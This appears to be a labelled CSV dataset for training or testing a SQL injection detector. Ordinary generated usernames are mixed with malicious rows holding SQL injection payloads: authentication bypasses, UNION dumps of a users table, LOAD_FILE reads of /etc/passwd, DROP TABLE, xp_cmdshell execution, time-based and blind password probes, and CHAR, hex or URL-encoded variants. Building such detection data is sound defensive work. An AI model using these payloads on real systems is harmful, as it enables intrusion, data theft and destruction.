name,is_malicious
katherinetaylor,0
raymondmunoz,0
tony98,0
ashleydixon,0
mariawatson,0
hoffmandeanna,0
jonesmark,0
cgardner,0
warnerlinda,0
troymartinez,0
ashleycastaneda,0
jamesstephanie,0
glenn51,0
browncaitlyn,0
zpope,0
gordoncraig,0
melendezaimee,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
owilliams' OR CHAR(49)=CHAR(49)--,1
zmarquez,0
jaredmccoy,0
john72,0
kenneth94,0
gmata,0
bblanchard,0
henrykathleen,0
wday,0
zmurray,0
justin57,0
julie97,0
williamskathleen,0
ianderson,0
cdiaz,0
angelpage,0
patrickpearson' OR SOUNDEX('test')=SOUNDEX('test')--,1
dustin24,0
hernandezluis,0
ramosalan,0
cooksandra,0
tinashepherd,0
angelahanson,0
aaroncollins,0
alvarezanthony,0
megan74,0
penny02,0
melissa75,0
ejohnson,0
tthomas,0
laura60,0
dmunoz,0
ugonzalez,0
tmartinez,0
robertbarnes,0
erichayes,0
mackmichael' OR BINARY 'a'='a'--,1
kevinmartin,0
pgarza,0
iwade,0
shawn81,0
stephen51,0
fowlerchristopher,0
donnadorsey,0
brandymiles,0
staceybrown,0
spearsnicholas,0
khanhenry,0
amandasmith,0
jamiemorton,0
fmoreno,0
curtis98,0
freemankeith,0
0x270x200x4f0x520x200x420x490x4e0x410x520x590x200x270x610x270x3d0x270x610x270x2d0x2d,1
hmiller,0
bphillips,0
kimberly23,0
canderson,0
keithpratt,0
eugeneadams,0
elizabeth08,0
anthonyramsey,0
kathleenalvarezCHAR(39)CHAR(124)CHAR(124)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
stoutjohnny,0
robin48,0
gregory99,0
gilmorerickey,0
christensenkevin,0
matthew17,0
fisherkimberly,0
nperez0x270x200x4f0x520x200x420x450x4e0x430x480x4d0x410x520x4b0x280x310x300x300x300x300x300x300x300x2c0x4d0x440x350x280x4e0x4f0x570x280x290x290x290x2d0x2d,1
michael01,0
audreyanderson,0
candicejoyce,0
awelch,0
jeremycarter,0
david63,0
tgonzalez,0
tadams,0
winterschristina,0
garciawilliam,0
carl44,0
hayley10,0
douglascarrie,0
deleonwilliam,0
georgepamela,0
kaylasuarez,0
jaredjones,0
kbryant,0
littlejonathan,0
timothy30,0
nancyking,0
ymoore,0
nolannathan,0
' UNION SELECT * FROM users--,1
lwilson,0
delacruzrachelCHAR(39)CHAR(59)CHAR(32)CHAR(68)CHAR(82)CHAR(79)CHAR(80)CHAR(32)CHAR(84)CHAR(65)CHAR(66)CHAR(76)CHAR(69)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(45)CHAR(45),1
davidbullock,0
mwhite,0
zmay,0
stacy13,0
andersontonya,0
richardsgary,0
megansmith,0
"jeffreyjacobs' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
annhuynh,0
csanchez,0
steven91,0
michele67,0
jhorton,0
marylopez,0
jorgewiggins,0
jeanettewhite'/**/OR/**/'1'='1,1
kaylee58,0
laura70,0
usmith' OR SOUNDEX('test')=SOUNDEX('test')--,1
james72CHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(65)CHAR(76)CHAR(76)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(76)CHAR(79)CHAR(65)CHAR(68)CHAR(95)CHAR(70)CHAR(73)CHAR(76)CHAR(69)CHAR(40)CHAR(39)CHAR(47)CHAR(101)CHAR(116)CHAR(99)CHAR(47)CHAR(112)CHAR(97)CHAR(115)CHAR(115)CHAR(119)CHAR(100)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
olsenpreston,0
msherman,0
matthewthompson,0
"lpeterson' OR BENCHMARK(10000000,MD5(NOW()))--",1
walkerkayla,0
mary09,0
ericwheeler,0
jessicapatterson,0
halljason,0
cooperjason'%20OR%201=1--,1
smithbrandi,0
' OR 1=1--,1
mcbridemark,0
deanna35,0
bsanchez,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
brianlopez,0
ashleydawson,0
mullenrachel,0
houstonlinda,0
cbecker,0
fsandoval,0
leetracy0x270x200x4f0x520x200x270x310x270x3d0x270x31,1
hortoncody,0
ypeterson,0
james78,0
tcarr,0
sparkswillie,0
suttontracy,0
%27 %4f%52 %27%31%27%3d%27%31,1
roblesmaria,0
cookdonald,0
xgonzalez,0
jakewells,0
candiceking,0
tholmes,0
pattonrichard,0
jpeters,0
leemike,0
brandon13,0
isellers,0
ydouglas,0
cindywilson,0
stacymorris,0
angela17,0
zramirez,0
carterdouglas' OR BINARY 'a'='a'--,1
edavis,0
"lwoods' OR BENCHMARK(10000000,MD5(NOW()))--",1
halejames,0
claudiamcdonald,0
ebaker,0
robertbell,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(67)CHAR(72)CHAR(65)CHAR(82)CHAR(40)CHAR(52)CHAR(57)CHAR(41)CHAR(61)CHAR(67)CHAR(72)CHAR(65)CHAR(82)CHAR(40)CHAR(52)CHAR(57)CHAR(41)CHAR(45)CHAR(45),1
rebecca77,0
"lisa50' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
hansenkaren,0
floresrachel,0
edward17,0
upacheco,0
frankweeks,0
milleralexandra,0
danielwelch,0
dodsonkristin,0
victorlandry,0
marc32,0
tanyamatthews,0
kingregina,0
curtis36,0
morenoelizabeth,0
walkerstacey,0
megan56,0
lgraham,0
howelljulie,0
rachel18,0
bwhite,0
chloe20,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
stevenmcbride,0
evan94,0
bradleyrodney,0
christinewatkins,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
dunndavid,0
vadams,0
brewernatasha,0
john37,0
obrienmark,0
mark11,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(40)CHAR(83)CHAR(76)CHAR(69)CHAR(69)CHAR(80)CHAR(40)CHAR(53)CHAR(41)CHAR(41)CHAR(41)CHAR(98)CHAR(65)CHAR(75)CHAR(76)CHAR(41)CHAR(45)CHAR(45),1
kyle13,0
claytonallen,0
debra31,0
myoung,0
jessereyes'%27%20OR%201=1--,1
jschroeder,0
%27 %4f%52 %43%48%41%52%28%34%39%29%3d%43%48%41%52%28%34%39%29--,1
samuel26,0
nguyenruth,0
billywalsh,0
djones,0
benjamin31,0
hamiltonnicholas,0
uhudson,0
jasonjohnson,0
david79,0
kennethkeller,0
jameslauren%27%3b %45%58%45%43 %78%70%5f%63%6d%64%73%68%65%6c%6c%28%27%64%69%72%27%29--,1
alan18,0
selenarobinson,0
hurleybrandy,0
rodneyking,0
veronicastein,0
ksmith,0
tracyharrison,0
thomasjeffrey,0
kristin80,0
lisaphillips,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(66)CHAR(73)CHAR(78)CHAR(65)CHAR(82)CHAR(89)CHAR(32)CHAR(39)CHAR(97)CHAR(39)CHAR(61)CHAR(39)CHAR(97)CHAR(39)CHAR(45)CHAR(45),1
leah88,0
steven46,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
chasejonathan,0
monicafletcher,0
ninaguzman,0
zbrown,0
gonzalezrebecca,0
john97,0
alvaradobrian,0
grantanthony,0
davidchandler,0
mark72,0
andersonjohn,0
espinozakelly,0
acooper,0
graydeborah,0
franklinheather,0
jessicaramirez,0
douglas20'; EXEC xp_cmdshell('dir')--,1
egalvan,0
nataliewhite,0
%27%7c%7c%27%31%27%3d%27%31,1
austinmacdonald,0
paige23,0
benjaminwells,0
drakejohnny,0
shannonjones,0
jgutierrez,0
steven43,0
sean38,0
keith10,0
richardcardenas,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
patriciastewart,0
stephensontony,0
miranda62,0
ntaylor,0
hmoore,0
mmccullough,0
"anna66'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
thomasmichelle,0
robertslindsay,0
lacey15,0
mary10,0
romerolisa,0
lopezmarisa,0
noah48,0
zturner,0
alexander58,0
kgardner,0
floresangela,0
sydney93,0
williamsmatthew,0
jlambert,0
"jessicathomas'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
faithvasquez,0
christine33,0
guerralinda,0
gwelch,0
elliottbruce,0
kimberlyshah,0
qjones,0
diane31,0
hmiller,0
oholland,0
bellzachary,0
baileyrickey,0
keithbullock,0
joshuarivera,0
david19,0
beckjake,0
richard83,0
hillnicole' OR 0x50=0x50--,1
kayla86,0
kristinahudson,0
allenaaron,0
'/**/OR/**/'1'='1,1
williamjohnston,0
mercerbrianna,0
jacksonbrian,0
"brownjason' OR BENCHMARK(10000000,MD5(NOW()))--",1
powellstacey,0
mfoster' OR BINARY 'a'='a'--,1
jeremy61,0
petersonallison,0
ashley01%27 %4f%52 %27%31%27%3d%27%31,1
bradleyreed,0
andrew95,0
anthonybooker,0
peterrowe,0
stevenmack,0
mistyramirez,0
cbaxter,0
francisco51,0
shane37,0
christopher58,0
fordmartin,0
fwhite,0
michael77,0
jessicaschmitt,0
dickersonzachary,0
laurajenkins,0
folson,0
0x270x200x4f0x520x200x310x3d0x310x2d0x2d,1
wilsonrichard,0
hansenbrandonCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
mary36,0
bennettwilliam,0
john96,0
amberwilliams,0
fieldsjames,0
"eric62' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
melissaparsons,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
CHAR(39)CHAR(43)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(39)CHAR(48)CHAR(39)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(32)CHAR(87)CHAR(72)CHAR(69)CHAR(82)CHAR(69)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(110)CHAR(97)CHAR(109)CHAR(101)CHAR(61)CHAR(39)CHAR(97)CHAR(100)CHAR(109)CHAR(105)CHAR(110)CHAR(39)CHAR(32)CHAR(65)CHAR(78)CHAR(68)CHAR(32)CHAR(83)CHAR(85)CHAR(66)CHAR(83)CHAR(84)CHAR(82)CHAR(73)CHAR(78)CHAR(71)CHAR(40)CHAR(112)CHAR(97)CHAR(115)CHAR(115)CHAR(119)CHAR(111)CHAR(114)CHAR(100)CHAR(44)CHAR(49)CHAR(44)CHAR(49)CHAR(41)CHAR(61)CHAR(39)CHAR(97)CHAR(39)CHAR(41)CHAR(43)CHAR(39),1
lfrank' OR 1=1--,1
jenkinsbrett' OR '1'='1,1
lewiskaylee,0
christophertorres,0
thomas47,0
'/**/OR/**/'1'='1,1
bradleymonica,0
melissaterry,0
timothy35,0
lewischristopher,0
devinsims,0
sweiss,0
aguilarjeffery,0
matthew67,0
clarknicole,0
kimberlyknight,0
alicestewart,0
benjamin08,0
simpsonerika,0
foxnathan0x270x200x4f0x520x200x430x480x410x520x280x340x390x290x3d0x430x480x410x520x280x340x390x290x2d0x2d,1
jordanspencer,0
stephaniegonzales,0
amy15,0
christina54' UNION SELECT * FROM users--,1
vashley,0
brandon49,0
jasonfields,0
zhumphrey,0
serranoanne%27 %4f%52 %30%78%35%30%3d%30%78%35%30--,1
ucarpenter,0
frank17,0
joseph82,0
anngonzales,0
taustin,0
reneecurtis,0
hallstacey,0
tara21,0
kathryn330x270x2f0x2a0x2a0x2f0x4f0x520x2f0x2a0x2a0x2f0x270x310x270x3d0x270x31,1
johnhansen,0
bakerluke,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
CHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(65)CHAR(76)CHAR(76)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(76)CHAR(79)CHAR(65)CHAR(68)CHAR(95)CHAR(70)CHAR(73)CHAR(76)CHAR(69)CHAR(40)CHAR(39)CHAR(47)CHAR(101)CHAR(116)CHAR(99)CHAR(47)CHAR(112)CHAR(97)CHAR(115)CHAR(115)CHAR(119)CHAR(100)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
zharris,0
0x270x200x4f0x520x200x270x310x270x3d0x270x31,1
richard79,0
wagneramanda,0
chrisgarcia,0
rtorres,0
fturner,0
michaelburnett,0
markreid,0
perkinschristian' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
hilllisa,0
rebecca97,0
jeandavis,0
uwilliams,0
kirstenjohnson,0
wcunningham,0
hoffmanleslie' OR 0x50=0x50--,1
"courtney00' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
jholmes,0
danielcurtis,0
' OR BINARY 'a'='a'--,1
kara22'%20OR%201=1--,1
joshua79,0
martinezalex,0
wwagner,0
craig94,0
branchchristopher,0
cherylcole,0
ashley11,0
"kbarnett'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
lallen'%27%20OR%201=1--,1
robertking,0
baileysarah,0
kellyvalencia,0
melindamejia,0
hmosley,0
cturner,0
nathaniel25,0
rodriguezandrew,0
alison00,0
bergmary,0
imullins,0
0x270x200x4f0x520x200x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x3d0x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x2d0x2d,1
mwilliams,0
mlong,0
nathan58,0
tammy83,0
james84' OR BINARY 'a'='a'--,1
phillip97,0
brendacole,0
juliapineda,0
estesdarrell,0
tturner,0
rickyscott,0
nlopez,0
fdunlap,0
qalvarado,0
thomasjoseph,0
haley74,0
katherinewashington,0
diana19,0
angela86,0
julie82,0
%27%25%32%30%4f%52%25%32%30%31%3d%31--,1
eddiemoore,0
alan80,0
jacqueline29,0
ryanhernandez,0
gardnermark,0
awillis,0
' OR CHAR(49)=CHAR(49)--,1
cardenasjenniferCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
sheltongregory,0
tammy62,0
victoria98,0
harristravis,0
claytonzachary,0
omarrichards,0
moorejohn,0
robertsmelissa,0
jonathanschmidt'%20OR%201=1--,1
jacquelinedavid,0
garciadavid,0
gknapp,0
parkermichael'%27%20OR%201=1--,1
dawnrobertson,0
edwardjohnson,0
antonioharris,0
perrybenjamin,0
alvinherring,0
davisjames,0
sarah16,0
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
"brianburton' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
shannon34,0
jbrown,0
lewisjennifer,0
wbrandt,0
patrick34,0
jessica31,0
ksnyder,0
cberry,0
ndean,0
jkirk,0
allenmadden,0
rmendoza,0
michael89,0
wigginsjohn,0
hernandezbruce,0
owenanthony,0
keith03,0
james97,0
melanie42,0
michelle17,0
bakerduane,0
brookecraig,0
'%27%20OR%201=1--,1
wrightdavid,0
ohawkins,0
yanderson,0
mary91,0
james68,0
jessica12,0
gibsonrebecca,0
vanessa03,0
corey93'||'1'='1,1
donna60,0
haynessteven,0
patrickwilliams,0
shawsarah,0
joshuahall'%27%20OR%201=1--,1
kathleen91,0
michelle05,0
peggy33,0
laurafranco,0
mpeck,0
danielle00,0
'; DROP TABLE users--,1
stephaniefrazier,0
hramos,0
hmartinez,0
vsalazar'/**/OR/**/'1'='1,1
njarvis,0
uhill,0
fmccullough,0
taylorkayla,0
elee,0
colin53,0
christopher72,0
jessica86,0
lynchjody,0
kellyjose,0
darryl84,0
norman39,0
tranpaul,0
CHAR(39)CHAR(32)CHAR(65)CHAR(78)CHAR(68)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(49)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(67)CHAR(79)CHAR(85)CHAR(78)CHAR(84)CHAR(40)CHAR(42)CHAR(41)CHAR(44)CHAR(67)CHAR(79)CHAR(78)CHAR(67)CHAR(65)CHAR(84)CHAR(40)CHAR(48)CHAR(120)CHAR(51)CHAR(97)CHAR(44)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(67)CHAR(85)CHAR(82)CHAR(82)CHAR(69)CHAR(78)CHAR(84)CHAR(95)CHAR(85)CHAR(83)CHAR(69)CHAR(82)CHAR(40)CHAR(41)CHAR(41)CHAR(44)CHAR(48)CHAR(120)CHAR(51)CHAR(97)CHAR(44)CHAR(70)CHAR(76)CHAR(79)CHAR(79)CHAR(82)CHAR(40)CHAR(82)CHAR(65)CHAR(78)CHAR(68)CHAR(40)CHAR(48)CHAR(41)CHAR(42)CHAR(50)CHAR(41)CHAR(41)CHAR(120)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(73)CHAR(78)CHAR(70)CHAR(79)CHAR(82)CHAR(77)CHAR(65)CHAR(84)CHAR(73)CHAR(79)CHAR(78)CHAR(95)CHAR(83)CHAR(67)CHAR(72)CHAR(69)CHAR(77)CHAR(65)CHAR(46)CHAR(80)CHAR(76)CHAR(85)CHAR(71)CHAR(73)CHAR(78)CHAR(83)CHAR(32)CHAR(71)CHAR(82)CHAR(79)CHAR(85)CHAR(80)CHAR(32)CHAR(66)CHAR(89)CHAR(32)CHAR(120)CHAR(41)CHAR(97)CHAR(41)CHAR(45)CHAR(45),1
'||'1'='1,1
cmiller,0
michael61,0
jessica74CHAR(39)CHAR(59)CHAR(32)CHAR(68)CHAR(82)CHAR(79)CHAR(80)CHAR(32)CHAR(84)CHAR(65)CHAR(66)CHAR(76)CHAR(69)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(45)CHAR(45),1
0x270x200x4f0x520x200x420x450x4e0x430x480x4d0x410x520x4b0x280x310x300x300x300x300x300x300x300x2c0x4d0x440x350x280x4e0x4f0x570x280x290x290x290x2d0x2d,1
'||'1'='1,1
wclark,0
jowens,0
martinhowell,0
stephenking,0
steelealbert,0
melissa64,0
fordkevin,0
johnwang,0
katie47,0
qwilliams,0
hughesalexander,0
cbarrett'||'1'='1,1
rodrigueztroy,0
hhughes,0
burnsangela' OR CHAR(49)=CHAR(49)--,1
hmartinez,0
andrew44,0
' OR BINARY 'a'='a'--,1
'%27%20OR%201=1--,1
agibson,0
ostephens,0
jameskenneth,0
joshuamartinez,0
william44,0
rpeterson,0
joy32%27%3b %45%58%45%43 %78%70%5f%63%6d%64%73%68%65%6c%6c%28%27%64%69%72%27%29--,1
greenscott,0
zlynch0x270x200x4f0x520x200x420x450x4e0x430x480x4d0x410x520x4b0x280x310x300x300x300x300x300x300x300x2c0x4d0x440x350x280x4e0x4f0x570x280x290x290x290x2d0x2d,1
francoderrick,0
gpeterson,0
nicole12,0
nelsonmartin'/**/OR/**/'1'='1,1
millerkristen,0
christopherroberts,0
natalie20,0
boydapril,0
tlang,0
williamjohnson,0
philip04,0
spencercarol,0
yjames,0
anthony79,0
conradaustin,0
lindsey41,0
randerson,0
mercadoheather,0
susanthomas,0
brianna48,0
lisa76,0
stewartcurtis,0
fullergeorge,0
qwilson,0
garmstrong,0
ericameyers,0
anthonychavez,0
jacksonkatherine,0
joseph03,0
edwardsmith,0
doris62,0
catherinemolina,0
znelson,0
williamcruz'; DROP TABLE users--,1
noah97,0
joseph49' UNION SELECT * FROM users--,1
manuelmann,0
rreedCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
'; DROP TABLE users--,1
johnsonmonica,0
jonathanchavez%27 %4f%52 %53%4f%55%4e%44%45%58%28%27%74%65%73%74%27%29%3d%53%4f%55%4e%44%45%58%28%27%74%65%73%74%27%29--,1
briansmith,0
pagenicholas,0
bellrebecca,0
williamrogers,0
powelldeborah,0
garrettamy0x270x250x320x370x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
daniellemcguire,0
gonzalezamy,0
sharon35,0
dominic03,0
cruzlisa,0
muellerbrandon,0
iunderwood,0
robert52,0
tmassey,0
kimjennifer,0
darrell85'||'1'='1,1
matthew66,0
hlee,0
cturner,0
pricemichael,0
rodgerslisa,0
jessica40,0
irivas,0
ehardy,0
laura86,0
fjackson,0
shawmarie,0
dlawrence,0
rmcbride,0
oscarmueller,0
bpowell'%20OR%201=1--,1
' OR CHAR(49)=CHAR(49)--,1
gamblesamantha,0
karaross,0
russell90,0
scott79,0
lori01,0
agregory' UNION SELECT * FROM users--,1
kkelly,0
obrennan,0
alvarezallen%27 %4f%52 %42%49%4e%41%52%59 %27%61%27%3d%27%61%27--,1
townsendbryan,0
christinaalexander,0
greenlori' UNION SELECT * FROM users--,1
xjackson' UNION SELECT * FROM users--,1
thomasmyers,0
robertperez,0
steven22,0
harrisonchristopher,0
sbrown,0
milesdylan,0
brianpatterson,0
christinadrake,0
'%27%20OR%201=1--,1
aguilarzachary,0
erica20,0
shawncollier,0
jefferybryant,0
ywilliams,0
alexcooper,0
lisa980x270x200x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x2a0x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d,1
richard88,0
ihines,0
vbrown,0
qwhite,0
karawilliams,0
justinjackson,0
jay00,0
omercado,0
ashleywilliams,0
tyler06,0
matthewduke,0
sandrathomas,0
sprice,0
wroberts,0
richardbaldwin,0
judyyates,0
ashley63,0
matthew35'; DROP TABLE users--,1
jonesjon' OR 0x50=0x50--,1
hkaiser,0
ijones,0
kathleenolson,0
0x270x200x4f0x520x200x270x310x270x3d0x270x31,1
meghanbennett' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
richard27,0
deborah77,0
nelsonjill,0
lloydjennifer,0
chloeanderson,0
davidward,0
samantha84,0
whampton,0
mcruz,0
jamesamy,0
ricky36' OR SOUNDEX('test')=SOUNDEX('test')--,1
glenn43,0
thompsondouglas,0
stephenrivas,0
reedjohn,0
'%27%20OR%201=1--,1
pamela01,0
smithapril,0
youngjeffrey,0
robertwalter,0
catherine47,0
derrickmarshall,0
coltonhill,0
mendezleah,0
CHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(65)CHAR(76)CHAR(76)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(76)CHAR(79)CHAR(65)CHAR(68)CHAR(95)CHAR(70)CHAR(73)CHAR(76)CHAR(69)CHAR(40)CHAR(39)CHAR(47)CHAR(101)CHAR(116)CHAR(99)CHAR(47)CHAR(112)CHAR(97)CHAR(115)CHAR(115)CHAR(119)CHAR(100)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
james44,0
williamsspencer' OR SOUNDEX('test')=SOUNDEX('test')--,1
robin25,0
'%20OR%201=1--,1
dparker' OR 0x50=0x50--,1
dgolden,0
lisalewis,0
wilkersonstephanie,0
michaelroberts,0
amandaallen,0
mezadylan,0
vroth,0
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
richardsonvalerie,0
lewislaurie,0
angiecabrera,0
kendragibson,0
sarahzimmerman,0
robert45CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
nicole29,0
tyler67,0
awilliams,0
derekorozco,0
donaldharris,0
wangpatrick,0
sandyhodges,0
abarr,0
kenneth34,0
michael80,0
ryan97,0
wwhite,0
ecook,0
jsosa,0
derrickjohnson,0
butlerzachary,0
"ortizmelissa'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
william76,0
aaronperez,0
reedoscar,0
lucaslori,0
jonescharles,0
andersonstacey'; DROP TABLE users--,1
thomaslee,0
jamesmartin,0
ramirezsean' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
vrussell,0
mnichols,0
peterschristine,0
jessicapittman,0
lbrown,0
%27%25%32%30%4f%52%25%32%30%31%3d%31--,1
qgomez,0
' OR BINARY 'a'='a'--,1
robertsonsamuel,0
johnsonwendy,0
scottdean,0
changbradley,0
tfields,0
david18,0
burnspaige,0
briannawells,0
hbrown,0
william69,0
michaelfitzgerald,0
0x270x200x4f0x520x200x310x3d0x310x2d0x2d,1
pamela66,0
brittanymcclure,0
cmorgan,0
michaelcohen,0
dhobbs,0
elizabeth28,0
jeremy03,0
thomaswhite,0
zromero,0
danielsantos,0
david65,0
ronnieknox,0
katherineorr' OR '1'='1,1
ryancarter,0
martinezdoris,0
garciajasmine,0
mayschristina,0
rachelcollins,0
perezamy,0
tcurry,0
drandolph,0
megan99,0
crussell,0
alicia46,0
jonathankrause,0
gloversabrina,0
sandovalsabrina,0
michelle48,0
pamelanelson,0
cdiaz,0
julie18,0
jennyowens,0
charles33,0
pricejoyce' OR 0x50=0x50--,1
greentheresa,0
cisnerosvictoria,0
jonsmith,0
wcurry,0
gordonharrington,0
aaronsavage,0
martha44,0
greenechristina,0
tina81,0
0x270x2f0x2a0x2a0x2f0x4f0x520x2f0x2a0x2a0x2f0x270x310x270x3d0x270x31,1
kmartinez,0
sconway,0
yodermicheal,0
davisjonathan,0
dbrown,0
rlove,0
natasha16,0
joycook,0
meganshaw,0
jessica83,0
carterstephanie,0
holdengregg,0
macdonaldjason,0
benjaminlynn,0
awright,0
melissa63,0
hudsonjames,0
paulburton,0
benjaminlong,0
gary86,0
jessicamiles,0
